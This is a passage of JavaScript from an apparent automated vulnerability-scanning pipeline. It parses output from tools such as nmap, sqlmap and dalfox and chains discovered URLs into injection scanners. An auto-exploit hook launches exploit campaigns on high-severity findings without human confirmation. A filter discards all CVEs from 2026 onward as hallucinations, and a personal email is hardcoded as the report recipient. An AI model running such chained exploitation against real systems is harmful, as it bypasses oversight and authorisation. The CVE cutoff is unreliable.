          await generateReport(scanId, 'info', 'all', 'full')
          const path = (await import('node:path')).default
          const { config } = await import('./config.js')
          const pdfPath = path.join(config.outputDir, `report-${scanId}.pdf`)
          
          const userEmail = scan.email_notify || process.env.NOTIFICATION_EMAIL || 'muhammadsaifudinmj@gmail.com'
          this.log(scanId, 'info', `📧 Dispatching audit report email to ${userEmail}...`)
          
          await sendScanAuditReportEmail({
            userEmail,
            scan,
            findings: scanFindings,
            pdfPath,
            repoName: scan.repo_name || scan.target,
            triggerSource: scan.trigger_source || 'automation',
            commitHash: scan.commit_hash,
          })
          this.log(scanId, 'info', `✅ Audit report email successfully delivered to ${userEmail}`)
        } catch (err) {
          this.log(scanId, 'warn', `⚠️ Auto email dispatch notice: ${err.message}`)
        }
      })
    }
  }

  /** Auto-exploit hook: launches a campaign for verified high/critical findings. */
  async _autoExploit(scanId, finding) {
    try {
      const scan = db.get(`SELECT * FROM scans WHERE id = ?`, scanId)
      if (!scan) return
      // Use the singleton ExploitOrchestrator from index.js (passed via pipeline constructor)
      const { ExploitOrchestrator } = await import('./exploits/orchestrator.js')
      const engine = this._exploitEngine || new ExploitOrchestrator({ io: this.io, pipeline: this })
      const result = await engine.launchCampaign(scan, finding)
      if (result?.campaignId) {
        this.log(scanId, 'info', `⚔️ Auto-exploit campaign launched: ${result.campaignId} (risk: ${result.risk || '?'})`)
      }
    } catch (e) {
      this.log(scanId, 'warn', `Auto-exploit launch failed: ${e.message}`)
    }
  }
}

export function computeRiskScore(counts) {
  const raw = (counts.critical || 0) * 10 + (counts.high || 0) * 7 + (counts.medium || 0) * 4 + (counts.low || 0) * 1.5 + (counts.info || 0) * 0.2
  const score = Math.min(10, Math.round((raw / Math.max(1, raw)) * 10 * (raw > 0 ? Math.min(1, raw / 20 + 0.4) : 0) * 10) / 10)
  return Math.min(10, Math.round((counts.critical * 3 + counts.high * 2 + counts.medium * 0.8 + counts.low * 0.2) * 10) / 10)
}

function cleanText(txt) {
  if (!txt) return ''
  return String(txt)
    .replace(/\x1B\[[0-9;]*[a-zA-Z]/g, '')
    .replace(/\r/g, '')
    .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F\u00A0]/g, ' ')
}

/**
 * Enforce maximum severity bounds for well-known low-impact finding categories.
 * AI often over-classifies these — e.g., console.log as "critical" or missing
 * rate limiting as "high". This function caps severity at the correct level.
 */
function enforceSeverityBounds(finding) {
  const sevRank = { info: 0, low: 1, medium: 2, high: 3, critical: 4 }
  const title = (finding.title || '').toLowerCase()
  const desc = (finding.description || '').toLowerCase()
  const text = `${title} ${desc}`
  const current = finding.severity || 'medium'

  // ── CAP: LOW severity at most ──
  const lowPatterns = [
    /console\.log/i,                                         // debug logging
    /missing rate limit/i,                                   // missing rate limiting
    /rate limiting/i,                                        // rate limiting
    /missing.*(?:captcha|brute.?force)/i,                   // missing CAPTCHA
    /commented.?out/i,                                       // commented-out code
    /debug.*(?:endpoint|mode|flag)/i,                        // debug endpoints
    /version.*disclos/i,                                     // version disclosure
    /banner.*disclos/i,                                      // banner disclosure
    /technology.*stack/i,                                    // tech stack disclosure
    /test.*(?:file|code|config)/i,                           // test files
    /console\.(?:warn|error|info|debug|trace)/i,             // any console method
    /debug log/i,                                            // debug logging
    /log.*sensitive/i,                                       // logging (unless actual secrets)
    /missing.*(?:audit.*log|logging)/i,                      // missing audit logging
    /(?:insufficient|weak).*password.*policy/i,              // password policy
    /no.*(?:captcha|rate)/i,                                 // no rate limiting/captcha
    /missing.*(?:csrf|CORS)/i,                               // missing CSRF/CORS (unless wildcard)
  ]
  for (const re of lowPatterns) {
    if (re.test(text) && sevRank[current] > sevRank.low) {
      return { ...finding, severity: 'low' }
    }
  }

  // ── CAP: MEDIUM severity at most ──
  const mediumPatterns = [
    /missing.*(?:security.*header|HSTS|CSP|X-Frame|X-Content|Referrer|Permissions)/i,
    /weak.*(?:crypto|cipher|hash|algorithm)/i,               // weak crypto
    /MD5|SHA1/i,                                             // weak hash
    /Math\.random/i,                                         // weak random
    /(?:unsafe|weak).*deserial/i,                            // unsafe deserialization (unless proven exploitable)
    /missing.*(?:input.*validation|sanitiz)/i,               // missing input validation
    /error.*(?:message|stack).*leak/i,                       // error disclosure
    /directory.*listing/i,                                   // directory listing
    /default.*(?:credential|password)/i,                     // default credentials
    /unrestricted.*file.*upload/i,                           // unrestricted upload (unless proven)
    /CORS.*(?:wildcard|misconfig)/i,                         // CORS misconfiguration
    /open.*redirect/i,                                       // open redirect
    /missing.*auth.*(?:guard|middleware|check)/i,            // missing auth guard (unless proven bypass)
  ]
  for (const re of mediumPatterns) {
    if (re.test(text) && sevRank[current] > sevRank.medium) {
      return { ...finding, severity: 'medium' }
    }
  }

  // ── CAP: HIGH severity at most (never let these become critical) ──
  const highPatterns = [
    /hardcoded.*(?:secret|key|password|token|credential)/i,  // hardcoded secrets (critical only if actual prod values)
    /SQL.*injection.*(?:ORM|TypeORM|Prisma|Sequelize)/i,     // ORM SQL injection (critical only if raw string concat)
    /(?:XSS|cross.?site.*script)/i,                          // XSS (critical only if stored + no CSP)
    /(?:path|directory).*traversal/i,                        // path traversal
    /SSRF/i,                                                 // SSRF
    /IDOR|insecure.*direct.*object/i,                        // IDOR
    /authentication.*(?:bypass|failure)/i,                   // auth issues
    /session.*(?:fixation|hijack)/i,                         // session issues
    /JWT.*(?:none|weak|missing)/i,                           // JWT issues
  ]
  for (const re of highPatterns) {
    if (re.test(text) && sevRank[current] > sevRank.high) {
      return { ...finding, severity: 'high' }
    }
  }

  return finding
}

/** Resolve a truncated file path from AI findings against the full file list.
 *  AI sometimes returns 'src/utils/fileUpload.js' when the actual path is
 *  'Aziz/src/utils/fileUpload.js'. This matches by suffix to find the full path. */
function resolveFilePath(reportedPath, files) {
  if (!reportedPath) return null
  // If the path already matches a file exactly, return it as-is
  for (const f of files) {
    if (f.path === reportedPath) return reportedPath
  }
  // Try suffix matching: find the file whose path ends with the reported path
  const normalized = reportedPath.replace(/\\/g, '/')
  let best = null
  for (const f of files) {
    const fp = f.path.replace(/\\/g, '/')
    if (fp.endsWith('/' + normalized) || fp === normalized) {
      // Prefer the shortest match (most specific folder prefix)
      if (!best || fp.length < best.length) best = fp
    }
  }
  return best || reportedPath // fallback to whatever the AI returned
}

/** Heuristic extraction of findings from raw tool output. Grounded, no hallucination. */
function extractFindingsFromOutput(tool, output, target = '') {
  const findings = []
  const cleanOutput = cleanText(output)
  const lines = cleanOutput.split('\n')
  const discoveredUrls = [] // collected for chaining into dalfox/sqlmap
  const push = (title, severity, evidence, extra = {}) => findings.push({
    title: cleanText(title).replace(/\s+/g, ' ').trim(), severity, description: cleanText(evidence).slice(0, 400), evidence: { tool, raw: cleanText(evidence).slice(0, 800) }, ...extra,
  })

  // ── nmap: open ports + service versions + script findings ──
  if (tool === 'nmap') {
    const portRe = /^(\d+)\/(tcp|udp)\s+(\S+)\s+(\S+)\s*(.*)$/
    const risky = { 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 445: 'SMB', 3389: 'RDP', 3306: 'MySQL', 5432: 'PostgreSQL', 6379: 'Redis', 27017: 'MongoDB', 9200: 'Elasticsearch', 1433: 'MSSQL', 5900: 'VNC', 11211: 'Memcached' }
    for (const line of lines) {
      const cleanLine = line.trim()
      const m = cleanLine.match(portRe)
      if (m && m[3] === 'open') {
        const port = parseInt(m[1])
        const svc = m[4]
        const ver = m[5]?.trim() || ''
        const isRisky = risky[port]
        push(
          `Open port ${port}/${m[2]} (${svc}${ver ? ` — ${ver}` : ''})${isRisky ? ` [${isRisky}]` : ''}`,
          isRisky ? 'medium' : 'info',
          cleanLine,
          { port, service: svc }
        )
      }
      // nmap NSE script findings (e.g. "| ssl-heartbleed: VULNERABLE" or "| vulners: CVE-2023-38408 7.5")
      // Skip future-date CVEs (CVE-2026+) and negative results
      if (/^\|.*(vulnerab|CVE-|backdoor|anonymous|weak)/i.test(cleanLine)) {
        const cveMatch = cleanLine.match(/(CVE-(\d{4})-\d+)/i)
        // Skip future-year CVEs (CVE-2026 and beyond) — these are hallucinations
        if (cveMatch && parseInt(cveMatch[2]) >= 2026) continue
        // Skip negative/not-found messages
        if (/not vulnerable|not found|no (vulnerab|backdoor|issue)|couldn'?t find|state: /i.test(cleanLine)) continue
        const cvssMatch = cleanLine.match(/\b(\d+\.\d+)\b/)
        const cvss = cvssMatch ? parseFloat(cvssMatch[1]) : 0
        // Severity based on CVSS score, not blindly "high" — version-only matches are weak
        const sev = cvss >= 9.0 ? 'critical' : cvss >= 7.0 ? 'high' : cvss >= 4.0 ? 'medium' : 'low'
        const title = cveMatch
          ? `nmap vulners: ${cveMatch[1].toUpperCase()}${cvssMatch ? ` (CVSS ${cvssMatch[1]})` : ''}`
          : `nmap script: ${cleanLine.replace(/^[|\s#]+/, '').replace(/http\S+/gi, '').slice(0, 90)}`
        push(title, sev, cleanLine, { cveId: cveMatch ? cveMatch[1].toUpperCase() : null })
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── wpscan JSON: WordPress vulns (authoritative) ──
  if (tool === 'wpscan') {
    try {
      const start = output.indexOf('{')
      if (start >= 0) {
        const j = JSON.parse(output.slice(start))
        const interesting = j.interesting_findings || []
        for (const f of interesting.slice(0, 10)) {
          push(`wpscan: ${f.to_s || f.type || 'finding'}`, 'low', f.to_s || JSON.stringify(f).slice(0, 300))
        }
        const vulns = [
          ...(j.version?.vulnerabilities || []),
          ...Object.values(j.plugins || {}).flatMap(p => p.vulnerabilities || []),
          ...Object.values(j.themes || {}).flatMap(t => t.vulnerabilities || []),
        ]
        for (const v of vulns.slice(0, 20)) {
          push(
            `WordPress vuln: ${v.title}`,
            /rce|sqli|sql injection|auth bypass/i.test(v.title) ? 'high' : 'medium',
            `${v.title} — refs: ${(v.references?.cve || []).join(', ') || 'none'}`,
            { cveId: v.references?.cve?.[0] ? `CVE-${v.references.cve[0]}` : null }
          )
        }
        if (j.users) for (const u of Object.keys(j.users).slice(0, 5)) {
          push(`WordPress user enumeration: ${u}`, 'low', `Enumerated WP username "${u}"`)
        }
      }
    } catch { /* not json, fall through */ }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── katana JSONL: crawl URLs → feed dalfox/sqlmap ──
  if (tool === 'katana') {
    for (const line of lines) {
      if (!line.trim().startsWith('{')) continue
      try {
        const j = JSON.parse(line)
        const url = j.request?.endpoint || j.endpoint || j.url
        if (url) {
          discoveredUrls.push(url)
          // URLs with params are injection candidates
          if (/\?[^=]+=/.test(url)) {
            push(`katana: Parameterized endpoint ${url.slice(0, 120)}`, 'info', url, { url })
          }
          // Sensitive paths
          if (/admin|backup|config|\.git|\.env|upload|debug|phpinfo|console|actuator|swagger|api-doc/i.test(url)) {
            push(`katana: Sensitive path discovered — ${url.slice(0, 120)}`, 'medium', url, { url })
          }
        }
      } catch { /* skip */ }
    }
    if (findings.length || discoveredUrls.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── dalfox: confirmed XSS (JSON array) ──
  if (tool === 'dalfox') {
    // dalfox --format json outputs a JSON array of results
    try {
      const start = output.indexOf('[')
      if (start >= 0) {
        const arr = JSON.parse(output.slice(start))
        for (const r of arr.slice(0, 20)) {
          push(
            `XSS (${r.type || 'reflected'}) in param "${r.param || '?'}" — ${(r.data || r.url || '').slice(0, 100)}`,
            /stored/i.test(r.type) ? 'high' : 'medium',
            `${r.type} XSS via ${r.param}: ${r.poc || r.data || ''}`.slice(0, 300),
            { cweId: 'CWE-79', url: r.data || r.url }
          )
        }
      }
    } catch { /* fall through to text mode */ }
    if (!findings.length) {
      for (const line of lines) {
        if (/\[POC\]|\[V\]|vulnerable|reflected|stored/i.test(line) && /param|xss|inject/i.test(line) && !/not vulnerable|no (?:vulnerab|result|parameter)|couldn'?t find/i.test(line)) {
          push(`dalfox: ${line.trim().slice(0, 140)}`, 'medium', line.trim(), { cweId: 'CWE-79' })
        }
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── sqlmap: confirmed injection ──
  if (tool === 'sqlmap') {
    // Only match positive confirmation — skip "not injectable", "do not appear to be injectable"
    const injectable = /(parameter '(.+)' is vulnerable|is vulnerable to|(?<!\bnot )injectable|(?<!\bnot appear to be )injectable)/i
    for (let i = 0; i < lines.length; i++) {
      // Skip lines that are clearly negative
      if (/not injectable|do not appear to be injectable|no parameter found|all tested parameters do not appear|back-end dbms is/i.test(lines[i])) continue
      if (injectable.test(lines[i])) {
        const ctx = lines.slice(Math.max(0, i - 2), i + 3).join('\n')
        push(
          `SQL Injection — ${lines[i].trim().slice(0, 140)}`,
          'critical',
          ctx.slice(0, 400),
          { cweId: 'CWE-89', owaspCategory: 'A03:2021-Injection' }
        )
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── subfinder / amass / dnsbrute: one subdomain per line ──
  if (tool === 'subfinder' || tool === 'amass' || tool === 'dnsbrute' || tool === 'dnsrecon') {
    const seen = new Set()
    for (const line of lines) {
      // gobuster dns: "Found: subdomain.example.com" or plain "subdomain.example.com"
      let h = ''
      const foundMatch = line.match(/Found:\s*([a-z0-9.-]+\.[a-z]{2,})/i)
      if (foundMatch) { h = foundMatch[1].toLowerCase() }
      else {
        const m = line.match(/([a-z0-9.-]+\.[a-z]{2,})/i)
        if (m) h = m[1].toLowerCase()
      }
      if (!h) continue
      // filter out the target itself and wildcards
      if (seen.has(h)) continue
      seen.add(h)
      push(`Subdomain: ${h}`, 'info', h, { url: `https://${h}` })
    }
    if (findings.length) return { findings: findings.slice(0, 50), discoveredUrls }
  }

  // ── gobuster dir: directory brute-force results ──
  // Output: "/path           (Status: 200) [Size: 1234]" or "[Status: 200, Size: 1234] /path"
  if (tool === 'gobuster') {
    const gobusterPaths = []
    for (const line of lines) {
      // Go-style: /path (Status: 200)
      const m1 = line.match(/^(\/\S+)\s+\(Status:\s*(\d{3})\)/)
      // Alternative: [Status: 200, Size: 1234] /path
      const m2 = line.match(/\[Status:\s*(\d{3}).*?\]\s+(\/\S+)/)
      const path = m1 ? m1[1] : m2 ? m2[2] : null
      const status = m1 ? m1[2] : m2 ? m2[1] : null
      if (path && path.length > 1 && !path.includes('FUZZ')) {
        gobusterPaths.push({ path, status: status || '200' })
      }
    }
    if (gobusterPaths.length) {
      const base = (target || '').replace(/\/$/, '')
      for (const p of gobusterPaths) discoveredUrls.push(`${base}${p.path.startsWith('/') ? '' : '/'}${p.path}`)
      const interesting = gobusterPaths.filter(p => /admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal|swagger|actuator|graphql/i.test(p.path))
      const others = gobusterPaths.filter(p => !/admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal|swagger|actuator|graphql/i.test(p.path))
      for (const p of interesting.slice(0, 10)) {
        push(`gobuster: Discovered ${p.path} (HTTP ${p.status})`, /admin|backup|\.git|\.env|config/i.test(p.path) ? 'medium' : 'low', `gobuster discovered ${p.path} with HTTP status ${p.status}`)
      }
      if (others.length) {
        push(`gobuster: ${others.length} additional paths discovered`, 'info', `Paths: ${others.slice(0, 5).map(p => p.path).join(', ')}${others.length > 5 ? '...' : ''}`)
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── httpx: HTTP probe results (ProjectDiscovery JSONL or plain status lines) ──
  if (tool === 'httpx') {
    let probed = 0
    for (const line of lines) {
      const t = line.trim()
      if (!t) continue
      // ProjectDiscovery JSON mode
      if (t.startsWith('{')) {
        try {
          const j = JSON.parse(t)
          const u = j.url || j.input || j.host
          const sc = j.status_code || j.statusCode || j['status-code']
          const title = j.title || ''
          const tech = (j.tech || j.technologies || []).join(', ')
          if (u) {
            push(`httpx: ${u} → HTTP ${sc || '?'}${title ? ` — ${title}` : ''}${tech ? ` [${tech}]` : ''}`.slice(0, 150), 'info', t.slice(0, 300), { url: u })
            if (u) discoveredUrls.push(u)
            probed++
          }
        } catch { /* not json */ }
        continue
      }
      // Python httpx / plain mode: "HTTP/1.1 200 OK" or status line
      const m = t.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/i) || t.match(/\b(\d{3})\b.*?(OK|Found|Moved|Forbidden|Unauthorized)/i)
      if (m && probed === 0) {
        push(`httpx: target responded HTTP ${m[1]}`, 'info', t.slice(0, 300))
        probed++
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── arjun: discovered hidden parameters ──
  if (tool === 'arjun') {
    for (const line of lines) {
      if (/parameters found|param.*found|GET:|POST:/i.test(line) && !/testing|probing/i.test(line)) {
        push(`arjun: ${line.trim().slice(0, 140)}`, 'low', line.trim())
      }
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // ── whatweb: technology fingerprinting ──
  // whatweb output: "http://target [200 OK] Tech1[version], Tech2[version], ..."
  if (tool === 'whatweb') {
    // Collect all technologies found across all lines
    const techs = new Set()
    let targetUrl = ''
    let httpStatus = ''
    for (const line of lines) {
      const t = line.trim()
      if (!t) continue
      // Extract URL and status from the beginning
      const urlMatch = t.match(/^(https?:\/\/\S+)\s+\[(\d{3}[^\]]*)\]/)
      if (urlMatch) {
        if (!targetUrl) targetUrl = urlMatch[1]
        if (!httpStatus) httpStatus = urlMatch[2]
      }
      // Extract individual technologies: Name[version] or Name
      const techMatches = t.matchAll(/([A-Z][\w-]+(?:\[[^\]]*\])?)/g)
      for (const m of techMatches) {
        const tech = m[1].trim()
        if (tech && !/^(OK|Found|Moved|Forbidden|Unauthorized|Redirect)/i.test(tech) && tech.length > 1) {
          techs.add(tech)
        }
      }
    }
    if (techs.size > 0) {
      const techList = [...techs].sort()
      // Interesting/risky technologies to highlight
      const risky = techList.filter(t => /apache|nginx|iis|tomcat|php|wordpress|jquery|bootstrap|laravel|django|flask|node|react|angular|jquery-migrate/i.test(t.toLowerCase()))
      const outdated = techList.filter(t => /jquery[/\[]1\.|jquery[/\[]2\.|php[/\[]5\.|php[/\[]7\.[0-2]|apache[/\[]2\.[0-2]|openssl[/\[]1\.[01]|tls[/\[]1\.[01]/i.test(t))
      if (outdated.length) {
        push(`Outdated technology detected: ${outdated.join(', ')}`, 'medium', `Outdated components: ${outdated.join(', ')}. These may have known vulnerabilities.`, { cweId: 'CWE-1104' })
      }
      if (risky.length) {
        push(`Technology stack: ${risky.join(', ')}${techList.length > risky.length ? ` (+${techList.length - risky.length} more)` : ''}`, 'info', `Detected technologies: ${techList.join(', ')}`)
      } else {
        push(`Technology fingerprint: ${techList.length} components detected`, 'info', `Detected technologies: ${techList.join(', ')}`)
      }
      if (targetUrl) discoveredUrls.push(targetUrl)
    }
    if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }
  }

  // Lines that are tool chatter, NOT vulnerabilities — never extract from these.
  const CHATTER = /^\[(info|warning|critical)\]\s+(testing|starting|checking|fetching|resuming|heuristic|no parameter|all tested|connection to|target url|using|loaded|parsed|there were|it is recommended|do you want|please wait|initializing|scanning|enumerating|waiting|the back-end|got a |redirecting to)/i
  // A line must carry a real signal to be considered evidence.
  const SIGNAL = /(vulnerab|CVE-\d{4}-\d+|matched|found \d|identified|confirmed|injectable|exposed|detected|Template:|template-id|\[critical\]|\[high\]|\[medium\]|\[low\])/i

  // Nuclei JSONL first (authoritative) — also collect URLs with params for chaining
  for (const line of lines) {
    if (line.trim().startsWith('{') && /"severity"/.test(line)) {
      try {
        const j = JSON.parse(line)
        push(j.info?.name || j.templateID || 'nuclei finding', (j.info?.severity || 'info').toLowerCase(), line, {
          cveId: j.info?.classification?.['cve-id']?.[0] || null,
          cweId: j.info?.classification?.['cwe-id']?.[0] || null,
        })
        if (j.matchedAt || j['matched-at']) discoveredUrls.push(j.matchedAt || j['matched-at'])
        if (j.host) discoveredUrls.push(j.host)
      } catch { /* skip */ }
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // Skip lines that are clearly negative results (not vulnerable, couldn't find, etc.)
  // Defined here so both severity-tagged & keyword-heuristic sections can use it
  const NEGATIVE = /(?:not (?:vulnerable|found|injectable|exploitable|affected)|no (?:vulnerab|issue|finding|parameter|result)s?|couldn'?t find|all tested parameters do not appear|no xss|no sql|testing connection|testing if|content is stable|heuristic (?:basic )?test|banner:|id=|name=|type=|scanning|starting|finished|loaded|parsed|waiting|it is recommended|do you want|please wait|initializing|enumerating|the back-end|got a |redirecting to|target url|using |connection to|fetching|resuming)/i

  // Severity-tagged lines (nikto/nuclei text mode) — skip chatter & negative results
  for (const line of lines) {
    if (CHATTER.test(line) || NEGATIVE.test(line)) continue
    const sev = line.match(/\[(critical|high|medium|low|info)\]/i)
    if (sev && SIGNAL.test(line) && !/no parameter|testing connection|testing if|content is stable|not vulnerable|no (?:vulnerab|result|issue|finding)/i.test(line)) {
      push(`${tool}: ${line.replace(/\s+/g, ' ').slice(0, 140)}`, sev[1].toLowerCase(), line)
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // Nikto-style findings: lines starting with "+"
  // Deduplicate "Suggested security header missing" — already covered by auditHttpBaseline.
  const seenHeaders = new Set()
  for (const line of lines) {
    if (!/^\+\s+\S+/.test(line)) continue
    // Skip duplicate header-missing nags
    const headerMatch = line.match(/Suggested security header missing:\s*([\w-]+)/i)
    if (headerMatch) {
      const h = headerMatch[1].toLowerCase()
      if (seenHeaders.has(h)) continue
      seenHeaders.add(h)
      // Only keep if it's NOT one of the 6 already checked by auditHttpBaseline
      const dupes = ['strict-transport-security', 'content-security-policy', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'permissions-policy']
      if (dupes.includes(h)) continue
    }
    if (/(\/|OSVDB|CVE|vulnerab|indexing|directory|config|admin|backup|\.git|\.env|sql|xss|rfi|lfi)/i.test(line)) {
      const sev = /osvdb|cve|vulnerab|\.git|\.env|sql|xss/i.test(line) ? 'medium' : 'low'
      push(`nikto: ${line.replace(/^\+\s*/, '').replace(/\s+/g, ' ').slice(0, 140)}`, sev, line)
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // ffuf directory fuzzing results — extract discovered paths with status codes
  const ffufPaths = []
  for (const line of lines) {
    // ffuf -s output: just the path (one per line)
    // ffuf normal output: [Status: 200, Size: 1234, ...] /path
    const pathMatch = line.match(/^\[Status:\s*(\d+).*?\]\s+(\S+)/i) || line.match(/^(\/\S+)$/)
    if (pathMatch) {
      const path = pathMatch[2] || pathMatch[1]
      const status = pathMatch[1] || null
      if (path && path.length > 1 && !path.includes('FUZZ')) {
        ffufPaths.push({ path, status: status || '200' })
      }
    }
  }
  if (ffufPaths.length) {
    // SPA catch-all detection: if >90% of ffuf results are 200 with similar size, it's a catch-all
    // Single-page apps route all paths to index.html — every path is a false positive
    const status200Count = ffufPaths.filter(p => p.status === '200').length
    const isSpaFuzz = ffufPaths.length > 50 && status200Count / ffufPaths.length > 0.9
    if (isSpaFuzz) {
      // Don't feed catch-all paths into chaining — they're all the same SPA page
      return { findings: [], discoveredUrls: [] }
    }
    // Feed ALL discovered paths into the chaining pool (base URL + path)
    const base = (target || '').replace(/\/$/, '')
    for (const p of ffufPaths) discoveredUrls.push(`${base}${p.path.startsWith('/') ? '' : '/'}${p.path}`)
    // Deliberately exclude 'sql|db' from the interesting-path regex — a path named
    // /sql or /db is NOT a SQL Injection finding and caused false positives.
    const interesting = ffufPaths.filter(p => /admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal/i.test(p.path))
    const others = ffufPaths.filter(p => !/admin|backup|config|\.git|\.env|api|dashboard|login|phpmyadmin|debug|internal/i.test(p.path))
    for (const p of interesting.slice(0, 10)) {
      push(`ffuf: Discovered ${p.path} (HTTP ${p.status})`, /admin|backup|\.git|\.env|config/i.test(p.path) ? 'medium' : 'low', `ffuf discovered ${p.path} with HTTP status ${p.status}`)
    }
    if (others.length) {
      push(`ffuf: ${others.length} additional paths discovered`, 'info', `Paths: ${others.slice(0, 5).map(p => p.path).join(', ')}${others.length > 5 ? '...' : ''}`)
    }
  }
  if (findings.length) return { findings: findings.slice(0, 30), discoveredUrls }

  // Keyword heuristics for non-tagged output — but only on lines that look like findings,
  // never from tool banner/info logs. Requires the vulnerability keyword AND a host/url/parameter context.
  // NEGATIVE regex defined above (shared with severity-tagged section)
  const text = output.toLowerCase()
  const KW = [
    [/sql injection|sqli|injectable parameter|is vulnerable to sql/, 'SQL Injection', 'high'],
    [/xss|cross-site scripting|reflected .*(script|xss)/, 'Cross-Site Scripting (XSS)', 'medium'],
    [/ssrf|server-side request forgery/, 'Server-Side Request Forgery', 'high'],
    [/command injection|remote code execution|\brce\b/, 'Command Injection / RCE', 'critical'],
    [/directory traversal|path traversal|lfi|local file inclusion/, 'Path Traversal / LFI', 'high'],
    [/open redirect/, 'Open Redirect', 'medium'],
    [/default (credentials|password)|weak password/, 'Weak / Default Credentials', 'high'],
    [/cve-\d{4}-\d+/, 'Known Vulnerable Component', 'high'],
    [/directory listing|index of \//, 'Directory Listing Enabled', 'low'],
    [/expired|self-signed|weak cipher/, 'TLS/SSL Configuration Issue', 'medium'],
  ]
  const seen = new Set()
  for (const [re, title, sev] of KW) {
    if (re.test(text) && !seen.has(title)) {
      // Find a line containing the keyword that is NOT chatter and NOT negative
      const evLine = lines.find(l => re.test(l.toLowerCase()) && !CHATTER.test(l) && !NEGATIVE.test(l))
      if (!evLine) continue
      push(title, sev, evLine)
      seen.add(title)
    }
  }
  return { findings: findings.slice(0, 30), discoveredUrls }
}

export default UnifiedPipeline
